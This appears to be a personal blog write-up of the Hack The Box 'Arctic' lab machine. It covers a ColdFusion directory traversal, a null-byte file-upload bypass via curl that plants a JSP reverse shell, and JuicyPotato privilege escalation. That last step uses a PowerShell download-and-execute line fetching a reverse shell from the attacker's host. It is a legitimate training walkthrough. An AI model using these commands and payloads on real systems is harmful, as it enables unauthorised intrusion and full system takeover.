---
layout: post
title: HTB-ARCTIC(10.10.10.11)
---

**Note: I solved these machines when I started my career. Recently I was checking my old study materials and found this all so I am posting it as it is how I wrote earlier**

**Short brief what I did: I scanned the machine and checked for available ports and found few ports open, later further recon i found some interesting files which was the connecting steps to gain root. Enjoy! Happy Hacking!!**

    nmap -sC -sV -T4 -Pn -p- -A -oA nmap/arctic 10.10.10.11

**Output**  

    PORT      STATE SERVICE VERSION
    135/tcp   open  msrpc   Microsoft Windows RPC
    8500/tcp  open  fmtp?
    49154/tcp open  msrpc   Microsoft Windows RPC

Let’s check in the browser – 10.10.10.11:8500

Found some index files

Going inside administrator got a login page – adobe coldfusion 

So, let’s search for vuln or exploit.

    searchsploit adobe coldfusion

Found many file, so let’s choose directory travasel file – 14641.py

Found a directory where the password of administrator was stored in hash.

So I used crackstation – password – happyday

So immediately logged in with this cred

After logging I was not able to find anything…

So later I googled about adobe coldfusion exploit found 2 exploits…first directory traversal and another is RCE….

So, in the RCE it was instructing to create a msfvenom payload and upload to directory.

Following some writeup…uploaded to directory…but the file was not showing in the browser.

***
    This was the reason [it makes two HTTP requests. First is a POST to FCKEDITOR_DIR,
    which has a default value of /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
    defined earlier in the script. Then it does a GET to /userfiles/file/ to trigger the payload.]

      curl -X POST -F newfile=@shell.jsp   'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/shell.jsp%00'

                <script type="text/javascript">
                        window.parent.OnUploadCompleted( 202, "", "shell.jsp", "0" );
                </script>
                                                                                                                                                             
┌──(root💀kali)-[~/HTB/arctic]

***

There are two things I need to set to get this upload to work, and both are set in the MSF exploit.
First, I can’t have the filename end in jsp. That will be filtered out. 
The MSF script uses .txt, so I’ll mimic that by making a copy of my payload named shell.txt.
The MSF script also sets the Content-Type on the file to application/x-java-archive.

I’ll update the curl. I can adjust headers inside the form data by adding it inside the -F argument separated by ;:

    curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'

Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.

Here my file got uploaded and as I browsed …got my file…

Opened listener – nc –lvvp 4444  (as per my msfvenom payload)

In the browser clicked the file…and got the connection back…
Got user flag…

**Priv escalation**

As I saw SeImpersonate enabled…I quickly ran for juicy potato(Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM)
So here are my required files for juicypotato
1.shell.bat
2.shell.ps1
3.juicypotato.exe

    ls

JuicyPotato.exe shell.bat shell.ps1 

cat shell.bat
    
    powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.4/shell.ps1')
    
shell.ps1 is a file from nishang shell – invokepowershellreversetcp.ps1 – here I will add my ip and port number

Now let’s run juicypotato

    Directory of c:\Users\tolis\Downloads
    
    04/02/2022  04:39 ��    <DIR>          .
    04/02/2022  04:39 ��    <DIR>          ..
    04/02/2022  04:18 ��           347.648 jp.exe
    04/02/2022  04:39 ��                94 shell.bat
                   2 File(s)        347.742 bytes
                   2 Dir(s)   1.433.468.928 bytes free
    
    c:\Users\tolis\Downloads>jp.exe -l 1223 -p shell.bat -t *
    jp.exe -l 1223 -p shell.bat -t *
    Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1223
    ....
    [+] authresult 0
    {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
    
    [+] CreateProcessWithTokenW OK
    
        python -m SimpleHTTPServer 80                                                                                                                
    Serving HTTP on 0.0.0.0 port 80 ...
    10.10.10.11 - - [03/Feb/2022 10:31:55] "GET /shell.ps1 HTTP/1.1" 200 -
    
        nc -lvvp 1223      
    Ncat: Version 7.92 ( https://nmap.org/ncat )
    Ncat: Listening on :::1223
    Ncat: Listening on 0.0.0.0:1223
    Ncat: Connection from 10.10.10.11.
    Ncat: Connection from 10.10.10.11:49983.
    Windows PowerShell running as user ARCTIC$ on ARCTIC
    Copyright (C) 2015 Microsoft Corporation. All rights reserved.
    
    PS C:\Windows\system32>whoami
    nt authority\system

**Thank you for reading this article, If you have learned something from this(atleast 10% of this) i will be more happy.**

